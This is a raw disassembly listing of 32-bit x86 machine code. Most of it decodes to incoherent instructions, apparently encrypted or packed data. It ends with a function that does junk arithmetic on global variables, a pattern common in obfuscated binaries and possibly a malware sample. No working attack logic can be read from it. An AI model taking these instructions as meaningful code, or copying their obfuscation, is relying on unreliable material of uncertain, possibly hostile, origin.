  40df90:	imul   ebx,DWORD PTR [eax],0xa32b951d
  40df96:	mul    ch
  40df98:	jae    0x40e00a
  40df9a:	xchg   edx,eax
  40df9b:	jne    0x40df91
  40df9d:	icebp  
  40df9e:	cmc    
  40df9f:	outs   dx,DWORD PTR ds:[esi]
  40dfa0:	sub    al,0xde
  40dfa2:	sar    BYTE PTR [ebx+0x6f],cl
  40dfa5:	dec    ecx
  40dfa6:	outs   dx,BYTE PTR ds:[esi]
  40dfa7:	sbb    eax,DWORD PTR [ecx]
  40dfa9:	or     eax,0x915d413
  40dfae:	ds jl  0x40df72
  40dfb1:	aam    0x80
  40dfb3:	mov    edx,0xe36d34f0
  40dfb8:	xchg   ebx,eax
  40dfb9:	jo     0x40df6a
  40dfbb:	xchg   ecx,eax
  40dfbc:	out    0xa6,al
  40dfbe:	loope  0x40df60
  40dfc0:	out    0xc,eax
  40dfc2:	sbb    DWORD PTR [edx-0x1bf5628b],edx
  40dfc8:	out    0x5c,eax
  40dfca:	push   esp
  40dfcb:	and    BYTE PTR [eax-0x63],bl
  40dfce:	leave  
  40dfcf:	(bad)  
  40dfd0:	out    0x55,al
  40dfd2:	sub    al,0x44
  40dfd4:	add    eax,0x303a0391
  40dfd9:	xchg   ebp,eax
  40dfda:	sbb    al,0x7e
  40dfdc:	fstp   TBYTE PTR [edx-0x4e88426f]
  40dfe2:	xchg   edi,eax
  40dfe3:	xchg   edx,eax
  40dfe4:	mov    ebp,0xd67986a8
  40dfe9:	fcmovnbe st,st(4)
  40dfeb:	dec    ebx
  40dfec:	jg     0x40e016
  40dfee:	xchg   ebp,eax
  40dfef:	les    ecx,FWORD PTR [edi]
  40dff1:	adc    BYTE PTR [esi+esi*8+0x61],ch
  40dff5:	push   ss
  40dff6:	pusha  
  40dff7:	mov    esp,0xba4a4341
  40dffc:	mov    esp,0xfb653d21
  40e001:	mov    ch,0xe5
  40e003:	cwde   
  40e004:	pushf  
  40e005:	aas    
  40e006:	mov    esi,0x3069f7
  40e00b:	cmp    al,0x2e
  40e00d:	pop    ebp
  40e00e:	mov    ebp,0xff75a972
  40e013:	jp     0x40dfef
  40e015:	adc    DWORD PTR [ebp-0x3ddf9393],eax
  40e01b:	outs   dx,BYTE PTR ds:[esi]
  40e01c:	stos   BYTE PTR es:[edi],al
  40e01d:	push   esi
  40e01e:	push   ebp
  40e01f:	sub    cl,bl
  40e021:	dec    eax
  40e022:	cmp    bl,BYTE PTR ds:0xaa6a645a
  40e028:	lods   eax,DWORD PTR ds:[esi]
  40e029:	(bad)  
  40e02b:	pop    ebx
  40e02c:	mov    WORD PTR [edi],fs
  40e02e:	xchg   edi,eax
  40e02f:	xchg   ecx,eax
  40e030:	mov    WORD PTR [ecx+0x33],fs
  40e033:	pop    ds
  40e034:	daa    
  40e035:	scas   eax,DWORD PTR es:[edi]
  40e036:	inc    edi
  40e037:	xchg   BYTE PTR [edi-0xa6e631b],bh
  40e03d:	(bad)  
  40e03e:	cmp    BYTE PTR [edx],ah
  40e040:	(bad)  
  40e041:	adc    BYTE PTR [eax-0x4c],dh
  40e044:	into   
  40e045:	and    DWORD PTR [ebx+0x7dec3f6e],ebp
  40e04b:	dec    ebp
  40e04c:	fisttp DWORD PTR [esi+0xd]
  40e04f:	ret    0xecaf
  40e052:	adc    edi,DWORD PTR [ebp-0x66be8ab]
  40e058:	mov    al,ds:0x28f1df63
  40e05d:	addr16 rdpmc 
  40e060:	mov    eax,ds:0x328f52db
  40e065:	test   eax,0x26df8cb
  40e06a:	imul   edx,DWORD PTR [ebx],0xffffffa6
  40e06d:	mov    BYTE PTR [eax],al
  40e06f:	call   0xfd3774f0
  40e074:	hlt    
  40e075:	mov    cl,0x37
  40e077:	cmp    ecx,DWORD PTR [ecx+eax*1]
  40e07a:	outs   dx,DWORD PTR ds:[esi]
  40e07b:	dec    edx
  40e07c:	or     al,0x97
  40e07e:	mov    ch,0x4b
  40e080:	cdq    
  40e081:	sub    BYTE PTR [edx+0x27],al
  40e084:	jbe    0x40e0ae
  40e086:	je     0x40e025
  40e088:	addr16 or eax,0x270c3c91
  40e08e:	pushf  
  40e08f:	ror    BYTE PTR [ecx+0x4c1ab70d],0x1c
  40e096:	cmc    
  40e097:	or     eax,0xd3699dc9
  40e09c:	pop    ds
  40e09d:	push   edi
  40e09e:	cwde   
  40e09f:	imul   edx,DWORD PTR [eax-0x4c0477e],0x1c
  40e0a6:	dec    esp
  40e0a7:	cwde   
  40e0a8:	jae    0x40e083
  40e0aa:	cmp    al,0xae
  40e0ac:	cmp    al,0x71
  40e0ae:	cdq    
  40e0af:	ror    cl,1
  40e0b1:	pop    es
  40e0b2:	inc    esp
  40e0b3:	sti    
  40e0b4:	pop    ecx
  40e0b5:	loop   0x40e0f3
  40e0b7:	jb     0x40e135
  40e0b9:	dec    ebp
  40e0ba:	pop    ds
  40e0bb:	lods   eax,DWORD PTR ds:[esi]
  40e0bc:	cdq    
  40e0bd:	in     al,0xfc
  40e0bf:	push   edx
  40e0c0:	mov    DWORD PTR [eax-0x39],ecx
  40e0c3:	adc    BYTE PTR [esi-0x46],bl
  40e0c6:	jns    0x40e0f0
  40e0c8:	jno    0x40e0d3
  40e0ca:	pop    esp
  40e0cb:	pop    eax
  40e0cc:	mov    eax,DWORD PTR [eax+0x1e]
  40e0cf:	int3   
  40e0d0:	push   0x18524cb8
  40e0d5:	or     eax,0x9b308aec
  40e0da:	(bad)  
  40e0db:	cmp    al,0x6e
  40e0dd:	add    esi,DWORD PTR [eax]
  40e0df:	test   BYTE PTR [ebx-0x1f],ah
  40e0e2:	fcmovu st,st(4)
  40e0e4:	gs pop edx
  40e0e6:	fcom   DWORD PTR [esp+ecx*4]
  40e0e9:	inc    edi
  40e0ea:	push   edi
  40e0eb:	mov    WORD PTR [ecx],es
  40e0ed:	loope  0x40e16c
  40e0ef:	shr    DWORD PTR [edx],1
  40e0f1:	ins    BYTE PTR es:[edi],dx
  40e0f2:	scas   al,BYTE PTR es:[edi]
  40e0f3:	adc    dh,BYTE PTR [ecx+0x50]
  40e0f6:	(bad)  
  40e0f7:	mov    dh,0x84
  40e0f9:	scas   eax,DWORD PTR es:[edi]
  40e0fa:	pop    ebp
  40e0fb:	and    DWORD PTR [ebp+eiz*4+0x17],0xbcd3a5b1
  40e103:	push   ecx
  40e104:	sub    ecx,ebp
  40e106:	aas    
  40e107:	addr16 std 
  40e109:	inc    edx
  40e10a:	pop    edx
  40e10b:	xlat   BYTE PTR ds:[ebx]
  40e10d:	mov    esi,0xcb19a70
  40e112:	xchg   DWORD PTR [edx+0x435cf6fd],ebx
  40e118:	push   eax
  40e119:	inc    edi
  40e11a:	mov    bl,0xdd
  40e11c:	push   0x3f515c48
  40e121:	fnstenv [ebx]
  40e123:	cmp    al,dh
  40e125:	jg     0x40e0e4
  40e127:	fwait
  40e128:	xchg   ebx,eax
  40e129:	dec    edi
  40e12a:	jne    0x40e1a4
  40e12c:	sub    ch,ah
  40e12e:	mov    esp,0xdb2c0217
  40e133:	ret    0x15bf
  40e136:	pop    ss
  40e137:	and    DWORD PTR [ebp+0x29da7bbf],esi
  40e13d:	nop
  40e13e:	push   ds
  40e13f:	jg     0x40e15b
  40e141:	loope  0x40e0c3
  40e143:	mov    esp,0xa17aa44
  40e148:	and    eax,0x88966fc5
  40e14d:	aaa    
  40e14e:	cs out 0x5a,al
  40e151:	push   ebp
  40e152:	fcmovne st,st(4)
  40e154:	out    0xe,al
  40e156:	mov    cl,al
  40e158:	sbb    al,0x71
  40e15a:	xchg   esp,eax
  40e15b:	out    0x3b,al
  40e15d:	or     DWORD PTR [edi+0x3f1d3e40],ecx
  40e163:	push   0x642e4e36
  40e168:	ret    
  40e169:	sub    dh,BYTE PTR [ebp-0x775ac9a4]
  40e16f:	mov    dh,bh
  40e171:	add    DWORD PTR [edx+0x3950e3d2],ecx
  40e177:	lea    ebx,[edx-0x17]
  40e17a:	mov    ebx,0x5e6eb42e
  40e17f:	stos   BYTE PTR es:[edi],al
  40e180:	dec    eax
  40e181:	push   ss
  40e182:	js     0x40e194
  40e184:	out    0x53,al
  40e186:	(bad)  
  40e187:	(bad)  
  40e188:	jae    0x40e1f5
  40e18a:	jmp    0x93fb:0x352adc5b
  40e191:	cmp    DWORD PTR [eax-0x7e4c9c28],esp
  40e197:	push   esp
  40e198:	icebp  
  40e199:	test   eax,0xefc80e3b
  40e19e:	fisttp QWORD PTR [ecx-0x5f157151]
  40e1a4:	cli    
  40e1a5:	dec    edi
  40e1a6:	cs loopne 0x40e186
  40e1a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1aa:	jae    0x40e1a7
  40e1ac:	jl     0x40e141
  40e1ae:	dec    ebp
  40e1af:	or     al,0xf4
  40e1b1:	(bad)  
  40e1b2:	shl    BYTE PTR [edi-0x15b1a71],1
  40e1b8:	mov    ds:0x8cd2725e,eax
  40e1bd:	(bad)  
  40e1be:	push   esi
  40e1bf:	adc    DWORD PTR [esi-0x6b5b1f26],ebp
  40e1c5:	push   esp
  40e1c6:	add    BYTE PTR [ebx-0x10],bh
  40e1c9:	ins    DWORD PTR es:[edi],dx
  40e1ca:	inc    esi
  40e1cb:	push   ds
  40e1cc:	sub    ch,BYTE PTR [edi+ebp*4+0x2774981d]
  40e1d3:	int3   
  40e1d4:	jae    0x40e246
  40e1d6:	stos   BYTE PTR es:[edi],al
  40e1d7:	arpl   si,dx
  40e1d9:	retf   
  40e1da:	lods   al,BYTE PTR ds:[esi]
  40e1db:	int    0x46
  40e1dd:	and    esi,DWORD PTR [edx+0x19]
  40e1e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e1:	jmp    0xf64ff0c3
  40e1e6:	dec    esp
  40e1e7:	xchg   edi,eax
  40e1e8:	popf   
  40e1e9:	mov    edx,0xa11eccfe
  40e1ee:	adc    bh,ah
  40e1f0:	loope  0x40e25e
  40e1f2:	mov    dl,0xe2
  40e1f4:	xchg   edx,eax
  40e1f5:	test   eax,0xb535234
  40e1fa:	retf   0xda56
  40e1fd:	cmp    DWORD PTR [ecx-0x744942c9],edx
  40e203:	sti    
  40e204:	mov    bh,0xea
  40e206:	jae    0x40e1b7
  40e208:	lods   eax,DWORD PTR ds:[esi]
  40e209:	repz mov ds:0x9d03420e,al
  40e20f:	xor    ah,cl
  40e211:	iret   
  40e212:	push   ebp
  40e213:	rcl    BYTE PTR [edx-0x5f],1
  40e216:	push   0x31
  40e218:	(bad)  
  40e219:	pop    ebx
  40e21a:	fstp   st(4)
  40e21c:	or     eax,0x9a6cbc7e
  40e221:	in     eax,dx
  40e222:	ins    DWORD PTR es:[edi],dx
  40e223:	pop    esp
  40e224:	cmp    eax,0x55f1d834
  40e229:	fmulp  st(1),st
  40e22b:	or     BYTE PTR [edi-0x5af61a15],al
  40e231:	loopne 0x40e248
  40e233:	out    0x2d,al
  40e235:	arpl   WORD PTR [ecx-0x4e],bx
  40e238:	xchg   ebp,eax
  40e239:	in     eax,0xf2
  40e23b:	cmp    ah,BYTE PTR [ebx+0x36a31144]
  40e241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e242:	jno    0x40e242
  40e244:	loopne 0x40e27f
  40e246:	pop    esi
  40e247:	outs   dx,BYTE PTR ds:[esi]
  40e248:	xlat   BYTE PTR ds:[ebx]
  40e249:	test   eax,0x8d3e470f
  40e24e:	out    0xf9,eax
  40e250:	scas   al,BYTE PTR es:[edi]
  40e251:	das    
  40e252:	das    
  40e253:	add    BYTE PTR [eax+0x2c],dh
  40e256:	ins    BYTE PTR es:[edi],dx
  40e257:	sti    
  40e258:	sbb    al,0xd7
  40e25a:	fmul   QWORD PTR [ebx+0x2c]
  40e25d:	ret    0x808f
  40e260:	inc    ecx
  40e261:	dec    ebp
  40e262:	enter  0xeb8,0x5f
  40e266:	js     0x40e20b
  40e268:	pop    ecx
  40e269:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40e26b:	(bad)  
  40e26d:	mov    ds,WORD PTR [ebp-0x4bbeac75]
  40e273:	call   0x73efabaf
  40e278:	adc    dh,BYTE PTR [esi]
  40e27a:	jmp    0xe79af7c2
  40e27f:	inc    ebx
  40e280:	and    eax,0x1f934959
  40e285:	je     0x40e232
  40e287:	push   es
  40e288:	ret    0xeeee
  40e28b:	dec    eax
  40e28c:	call   FWORD PTR [ebp+0x1e]
  40e28f:	sbb    ebp,esi
  40e291:	pop    esi
  40e292:	pop    ds
  40e293:	lea    ebx,[eiz*8+0x3fa2b9e]
  40e29a:	jge    0x40e28c
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x685e5ddc
  40e2c4:	cmp    BYTE PTR [esi-0x50],dh
  40e2c7:	cs stos BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	cld    
  40e2d0:	or     al,0x7
  40e2d3:	test   DWORD PTR [ecx-0x5b76e38f],0x44053f54
  40e2dd:	push   edx
  40e2de:	sub    bl,dh
  40e2e0:	adc    cl,ch
  40e2e2:	cmp    eax,edx
  40e2e4:	or     dl,0xee
  40e2e7:	jmp    0x8acfaef1
  40e2ec:	sahf   
  40e2ed:	out    dx,eax
  40e2ee:	ret    0x21f4
  40e2f1:	mov    ecx,0x17359316
  40e2f6:	mov    edx,0xca6025fb
  40e2fb:	pop    eax
  40e2fc:	mov    ds:0x71442514,al
  40e301:	adc    eax,0x35fefcc1
  40e306:	les    eax,FWORD PTR [eax+0x252b35dd]
  40e30c:	add    DWORD PTR [esi+0x109d9eae],ecx
  40e312:	int3   
  40e313:	mov    ah,0xef
  40e315:	cmp    al,0xdf
  40e317:	in     al,0x96
  40e319:	out    dx,eax
  40e31a:	pop    ecx
  40e31b:	push   cs
  40e31c:	sub    DWORD PTR [eax+0x684ef0c8],0x26
  40e323:	cmp    eax,0xdd5d47a3
  40e328:	gs jo  0x40e372
  40e32b:	pop    esp
  40e32c:	sbb    ebp,ecx
  40e32e:	xor    al,0xa1
  40e330:	ror    BYTE PTR [edi+0x7d2d6952],1
  40e336:	aam    0xad
  40e338:	jg     0x40e37e
  40e33a:	mov    ah,0x12
  40e33c:	in     eax,0x66
  40e33e:	xor    eax,0x3618092b
  40e343:	fadd   DWORD PTR [eax-0x5c204e60]
  40e349:	and    ebx,DWORD PTR [ecx+0x6e3c4663]
  40e34f:	fsubrp st(1),st
  40e351:	or     esi,DWORD PTR [ecx]
  40e353:	iret   
  40e354:	mov    ds:0xeb9c1979,al
  40e359:	es jbe 0x40e31b
  40e35c:	ja     0x40e2f8
  40e35e:	pop    esi
  40e35f:	inc    eax
  40e360:	or     al,0x3b
  40e362:	shl    DWORD PTR [esi-0x4a1a3d07],1
  40e368:	cdq    
  40e369:	out    0x67,eax
  40e36b:	xor    BYTE PTR [edx+0x4a],0x73
  40e36f:	loopne 0x40e394
  40e371:	pop    ds
  40e372:	es icebp 
  40e374:	dec    ebx
  40e375:	imul   eax,DWORD PTR [edi+0x66b84f7],0xffffff99
  40e37c:	dec    ebp
  40e37d:	push   ss
  40e37e:	xchg   edi,ebp
  40e380:	ss add ax,0x37ec
  40e385:	pop    edx
  40e386:	inc    ebx
  40e387:	lea    ecx,[edi-0x1173c164]
  40e38d:	and    dl,BYTE PTR gs:[edi-0x4af609d2]
  40e394:	sub    ecx,DWORD PTR [edi-0x2031e0d6]
  40e39a:	lock loope 0x40e3da
  40e39d:	push   0x5d586039
  40e3a2:	push   ecx
  40e3a3:	cmp    BYTE PTR [ecx-0x30],0xcd
  40e3a7:	test   al,cl
  40e3a9:	into   
  40e3aa:	(bad)  
  40e3ab:	xchg   edx,eax
  40e3ac:	jno    0x40e3c6
  40e3ae:	or     al,0xa0
  40e3b0:	mov    ebp,0xe319fcba
  40e3b5:	mov    edx,0xc3d9d4e0
  40e3ba:	and    BYTE PTR [edi+0x3c],cl
  40e3bd:	and    dh,BYTE PTR [ebx]
  40e3bf:	or     eax,0x71798d06
  40e3c4:	or     al,0x59
  40e3c6:	pop    eax
  40e3c7:	sbb    dl,BYTE PTR [esi+edi*1+0x74ad9b36]
  40e3ce:	add    ah,BYTE PTR [ecx-0x42]
  40e3d1:	ss daa 
  40e3d3:	test   eax,0x4e62a225
  40e3d8:	shl    dh,0xd2
  40e3db:	rcr    cl,1
  40e3dd:	ins    BYTE PTR es:[edi],dx
  40e3de:	lock add dl,BYTE PTR [edi-0x1a405ed7]
  40e3e5:	mov    cl,0x8e
  40e3e7:	push   esi
  40e3e8:	or     al,0x77
  40e3ea:	adc    edi,edi
  40e3ec:	dec    edi
  40e3ed:	mov    bh,0xba
  40e3ef:	cdq    
  40e3f0:	pop    ebp
  40e3f1:	repnz push eax
  40e3f3:	cmp    BYTE PTR [ecx+0x5f],bh
  40e3f6:	aaa    
  40e3f7:	rcr    DWORD PTR [edi-0x11],0xf0
  40e3fb:	in     al,0xba
  40e3fd:	out    0x68,al
  40e3ff:	sub    BYTE PTR [ebx-0x56512069],dl
  40e405:	daa    
  40e406:	(bad)  
  40e407:	cwde   
  40e408:	cmp    eax,DWORD PTR [ebx-0x706e8db4]
  40e40e:	sbb    DWORD PTR [edi-0x3b],ebp
  40e411:	push   es
  40e412:	scas   eax,DWORD PTR es:[edi]
  40e413:	retf   0xcd19
  40e416:	ja     0x40e3fc
  40e418:	retf   
  40e419:	div    DWORD PTR [edx-0x6f]
  40e41c:	inc    ecx
  40e41d:	or     dl,BYTE PTR gs:[edx]
  40e420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e421:	mov    dh,0x9a
  40e423:	inc    esi
  40e424:	cmp    al,0xe7
  40e426:	push   ss
  40e427:	mov    edi,0xfadda083
  40e42c:	ja     0x40e4a7
  40e42e:	or     edx,DWORD PTR [ebx+0xd]
  40e431:	mov    ebp,0xb5964a3a
  40e436:	retf   0xc1e5
  40e439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e43a:	pop    esi
  40e43b:	je     0x40e40f
  40e43d:	inc    edx
  40e43e:	stos   BYTE PTR es:[edi],al
  40e43f:	push   esi
  40e440:	fimul  WORD PTR [edx]
  40e442:	fwait
  40e443:	je     0x40e419
  40e445:	cld    
  40e446:	jno    0x40e3fc
  40e448:	mov    edi,0x11038a59
  40e44d:	dec    esp
  40e44e:	mov    WORD PTR [ebp+0x631b6757],fs
  40e454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e455:	stos   BYTE PTR es:[edi],al
  40e456:	sbb    DWORD PTR [edi-0x78ea5644],esp
  40e45c:	ret    
  40e45d:	aam    0x29
  40e45f:	aad    0xba
  40e461:	fldcw  WORD PTR [ebx]
  40e463:	rcr    DWORD PTR [edi-0x7ca50a50],cl
  40e469:	xchg   edx,eax
  40e46a:	scas   eax,DWORD PTR es:[edi]
  40e46b:	clc    
  40e46c:	jbe    0x40e45e
  40e46e:	mov    ch,0xf8
  40e470:	mov    eax,0xc8ae79bf
  40e475:	inc    bx
  40e477:	test   eax,0x88348c7f
  40e47c:	cmc    
  40e47d:	inc    esi
  40e47e:	lahf   
  40e47f:	cmp    bl,BYTE PTR [edx+0x3a]
  40e482:	xor    eax,0xb4a532b4
  40e487:	jb     0x40e472
  40e489:	std    
  40e48a:	jmp    0xdb08:0xb5c8d3a2
  40e491:	lds    ebp,FWORD PTR [ebp+0x6bc6eb2a]
  40e497:	test   al,0x78
  40e499:	sti    
  40e49a:	push   ds
  40e49b:	loop   0x40e518
  40e49d:	or     edx,ebx
  40e49f:	out    0xf6,eax
  40e4a1:	test   DWORD PTR [eax+0x2e4861a6],edi
  40e4a7:	xor    al,0x3e
  40e4a9:	sbb    DWORD PTR [esi-0x61dea56f],0xffffff98
  40e4b0:	xor    al,0x1e
  40e4b2:	ins    BYTE PTR es:[edi],dx
  40e4b3:	shr    DWORD PTR [edx-0x162e4a11],1
  40e4b9:	push   ebx
  40e4ba:	adc    BYTE PTR [eax-0x23],al
  40e4bd:	aaa    
  40e4be:	or     BYTE PTR [esi],bl
  40e4c0:	push   ebx
  40e4c1:	loopne 0x40e44a
  40e4c3:	mov    ebx,0xf02d3562
  40e4c8:	arpl   WORD PTR [esi-0x160063ca],sp
  40e4ce:	bound  ebx,QWORD PTR [ebx]
  40e4d0:	imul   edi,DWORD PTR [edi+ecx*1+0x161e51d8],0xffffffb3
  40e4d8:	imul   edx,DWORD PTR [ebx],0xf4a41336
  40e4de:	test   dl,ch
  40e4e0:	stos   BYTE PTR es:[edi],al
  40e4e1:	inc    ebx
  40e4e2:	mov    bl,ah
  40e4e4:	das    
  40e4e5:	repz imul edi,DWORD PTR [ebx-0x5514ba7d],0xffffff94
  40e4ed:	fild   QWORD PTR [ebx+0x1f]
  40e4f0:	sub    al,0x7f
  40e4f2:	cmp    ah,BYTE PTR [edx-0x1dcbc814]
  40e4f8:	pop    edi
  40e4f9:	(bad)  
  40e4fa:	cwde   
  40e4fb:	and    al,0x94
  40e4fd:	cs pusha 
  40e4ff:	mov    ds:0x18d9b5da,al
  40e504:	push   ebp
  40e505:	cmc    
  40e506:	inc    edx
  40e507:	imul   edx,DWORD PTR ds:0xa7e117f0,0xa89a9a3b
  40e511:	push   0x1c7fbed2
  40e516:	and    edi,DWORD PTR [ebx]
  40e518:	dec    ecx
  40e519:	and    eax,0xf680028
  40e51e:	ins    DWORD PTR es:[edi],dx
  40e51f:	(bad)  
  40e520:	int    0x33
  40e522:	addr16 xchg edx,eax
  40e524:	hlt    
  40e525:	mov    ds:0xd20a7dbc,al
  40e52a:	repnz dec esi
  40e52c:	and    bl,dh
  40e52e:	or     BYTE PTR [edi+0x3d],bl
  40e531:	aas    
  40e532:	stos   DWORD PTR es:[edi],eax
  40e533:	jno    0x40e4ce
  40e535:	jge    0x40e4c4
  40e537:	cdq    
  40e538:	xor    edi,esi
  40e53a:	dec    esp
  40e53b:	les    edi,FWORD PTR [edx+edi*1-0x65]
  40e53f:	or     eax,0xcff47084
  40e544:	and    al,dh
  40e546:	(bad)  
  40e548:	and    ebx,edx
  40e54a:	ficomp WORD PTR [ebp-0x19]
  40e54d:	arpl   WORD PTR [esi],cx
  40e54f:	ins    DWORD PTR es:[edi],dx
  40e550:	xor    ch,BYTE PTR [edx]
  40e552:	rcr    esi,0xb4
  40e555:	jp     0x40e53f
  40e557:	mov    bh,ah
  40e559:	sbb    dl,cl
  40e55b:	ins    BYTE PTR es:[edi],dx
  40e55c:	int3   
  40e55d:	fistp  DWORD PTR [edx]
  40e55f:	mov    ch,0xc3
  40e561:	retf   0x4265
  40e564:	dec    esi
  40e565:	arpl   WORD PTR [ebx+0xc45190f],di
  40e56b:	pop    ds
  40e56c:	ins    BYTE PTR es:[edi],dx
  40e56d:	xlat   BYTE PTR ds:[ebx]
  40e56e:	sbb    BYTE PTR [ecx],ch
  40e570:	cmp    BYTE PTR [edi-0x21],cl
  40e573:	ret    
  40e574:	cmp    al,0x33
  40e577:	aam    0x1a
  40e579:	mov    dh,0xe
  40e57b:	mov    dl,0xde
  40e57d:	jp     0x40e541
  40e57f:	adc    DWORD PTR [edi+0x512b9aad],ebx
  40e585:	sti    
  40e586:	mov    eax,0x4697e9a1
  40e58b:	(bad)  
  40e58c:	sbb    ecx,DWORD PTR [edi+0x3a]
  40e58f:	in     eax,0x9f
  40e591:	sbb    eax,0xcbb984d5
  40e596:	aam    0xf6
  40e598:	xchg   DWORD PTR [ebx],eax
  40e59a:	mov    eax,ds:0x78166ec3
  40e59f:	and    ecx,esi
  40e5a1:	sbb    DWORD PTR [eax+ebp*1],edi
  40e5a4:	mov    ds:0x53e17d22,al
  40e5a9:	into   
  40e5aa:	sbb    bl,al
  40e5ac:	lock enter 0xbc61,0xed
  40e5b1:	outs   dx,DWORD PTR ds:[esi]
  40e5b2:	into   
  40e5b3:	and    ch,BYTE PTR [eax+0x6c]
  40e5b6:	movlps xmm4,QWORD PTR [edi+0x4]
  40e5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5bb:	out    0xef,al
  40e5bd:	add    ah,BYTE PTR [edi-0x4b0b03bf]
  40e5c3:	out    dx,eax
  40e5c4:	sahf   
  40e5c5:	jnp    0x40e61c
  40e5c7:	cmp    ebx,DWORD PTR [ecx]
  40e5c9:	out    dx,eax
  40e5ca:	and    eax,0xf250d65d
  40e5cf:	pop    esp
  40e5d0:	sbb    ebp,esp
  40e5d2:	fs jns 0x40e622
  40e5d5:	stos   BYTE PTR es:[edi],al
  40e5d6:	inc    edx
  40e5d7:	mov    esp,0x15f9a73f
  40e5dc:	mov    esp,0x19e7ff59
  40e5e1:	pop    eax
  40e5e2:	(bad)  [edx-0x62]
  40e5e5:	shr    BYTE PTR [esi-0x31],1
  40e5e8:	jg     0x40e62f
  40e5ea:	scas   al,BYTE PTR es:[edi]
  40e5eb:	(bad)  
  40e5ec:	and    BYTE PTR [ecx+edi*4+0x76f0e675],ch
  40e5f3:	jb     0x40e5f5
  40e5f5:	shl    BYTE PTR [eax+0xb444c2f],1
  40e5fb:	pushf  
  40e5fc:	jecxz  0x40e629
  40e5fe:	loop   0x40e5eb
  40e600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e601:	(bad)  
  40e602:	stos   DWORD PTR es:[edi],eax
  40e603:	adc    BYTE PTR [ebp-0x70c96e52],dh
  40e609:	mov    ebx,gs
  40e60b:	or     DWORD PTR [edx-0x7a],ecx
  40e60e:	cmp    edx,DWORD PTR [ebx+ecx*1+0x6975f9bb]
  40e615:	aad    0x7a
  40e617:	add    al,0xee
  40e619:	leave  
  40e61a:	int3   
  40e61b:	xchg   esi,eax
  40e61c:	dec    ecx
  40e61d:	mov    ecx,0xd3e795d
  40e622:	scas   al,BYTE PTR es:[edi]
  40e623:	jecxz  0x40e638
  40e625:	outs   dx,DWORD PTR ds:[esi]
  40e626:	jg     0x40e5b4
  40e628:	mov    ds:0xb008c945,al
  40e62d:	int3   
  40e62e:	xor    BYTE PTR [ecx+0x7d3f849e],bh
  40e634:	xor    ah,0xd0
  40e637:	jnp    0x40e5f3
  40e639:	fbld   TBYTE PTR [ecx]
  40e63b:	adc    al,0xb4
  40e63d:	sub    eax,0x172267a3
  40e642:	sbb    al,BYTE PTR [eax-0x6b]
  40e645:	in     eax,dx
  40e646:	stos   BYTE PTR es:[edi],al
  40e647:	outs   dx,BYTE PTR ds:[esi]
  40e648:	into   
  40e649:	mov    dl,0x71
  40e64b:	sti    
  40e64c:	iret   
  40e64d:	dec    eax
  40e64e:	mov    ecx,0x779abe50
  40e653:	pusha  
  40e654:	sub    al,0x52
  40e656:	movaps XMMWORD PTR [ebx-0x28c3524b],xmm7
  40e65d:	dec    ecx
  40e65e:	adc    edi,DWORD PTR [eax-0xf9766ff]
  40e664:	fsub   DWORD PTR [ebx+0x516dfd3a]
  40e66a:	call   0x145219fa
  40e66f:	inc    eax
  40e670:	jae    0x40e69e
  40e672:	mov    esi,0x44cef1d7
  40e677:	bound  eax,QWORD PTR [esi-0x43]
  40e67a:	iret   
  40e67b:	jbe    0x40e6b7
  40e67d:	pop    ecx
  40e67e:	or     BYTE PTR [edx+0x3cae7a4],0xcc
  40e685:	push   ebx
  40e686:	sbb    BYTE PTR [edx-0x73],ch
  40e689:	xor    BYTE PTR [edx+0x11],bh
  40e68c:	test   al,0x8d
  40e68e:	aad    0xb1
  40e690:	add    cl,al
  40e692:	fcmovnb st,st(3)
  40e694:	rcl    DWORD PTR [esp+eax*4],1
  40e697:	fsubr  DWORD PTR [edx]
  40e699:	sub    ch,ch
  40e69b:	nop
  40e69c:	push   0x55411813
  40e6a1:	pop    es
  40e6a2:	sub    edi,DWORD PTR [esi-0x3df883c7]
  40e6a8:	in     al,dx
  40e6a9:	popf   
  40e6aa:	loopne 0x40e658
  40e6ac:	shr    DWORD PTR ds:0xdd15676d,cl
  40e6b2:	(bad)  
  40e6b3:	adc    esi,eax
  40e6b5:	(bad)  
  40e6b7:	ja     0x40e69c
  40e6b9:	ss test eax,0xdd364094
  40e6bf:	jns    0x40e701
  40e6c1:	sbb    al,0xce
  40e6c3:	clc    
  40e6c4:	and    eax,0x3a074c2e
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434793,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x434743,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x4346c7
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x4346bb,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434683,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x4346b7,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x434747,0x43465f
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x43466b,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x4346bb,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
